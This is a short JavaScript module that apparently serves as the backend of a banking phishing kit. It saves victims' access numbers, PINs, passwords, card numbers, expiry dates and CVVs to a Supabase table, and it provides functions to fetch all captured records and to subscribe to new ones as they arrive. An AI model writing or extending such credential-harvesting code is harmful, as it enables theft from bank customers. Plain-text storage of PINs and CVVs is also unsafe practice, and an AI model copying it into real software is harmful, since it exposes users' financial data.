import { supabase } from './firebase';

export const saveCompleteUserData = async (completeData) => {
  const { accessNumber, pin, userNumber, password, cardNumber, expiryDate, cvv } = completeData;
  const { data, error } = await supabase
    .from('complete_user_data')
    .insert([{ accessNumber, pin, userNumber, password, cardNumber, expiryDate, cvv, completedAt: new Date().toISOString(), status: 'completed' }])
    .select();

  if (error) { console.error('Supabase insert error:', error); throw error; }
  return data[0].id;
};

export const fetchUserData = async () => {
  const { data, error } = await supabase
    .from('complete_user_data')
    .select('*')
    .order('completedAt', { ascending: false });

  if (error) throw error;
  return data;
};

export const subscribeToUserData = (callback) => {
  const channel = supabase
    .channel('complete_user_data_changes')
    .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'complete_user_data' },
      () => { fetchUserData().then(callback); }
    )
    .subscribe();

  return () => supabase.removeChannel(channel);
};
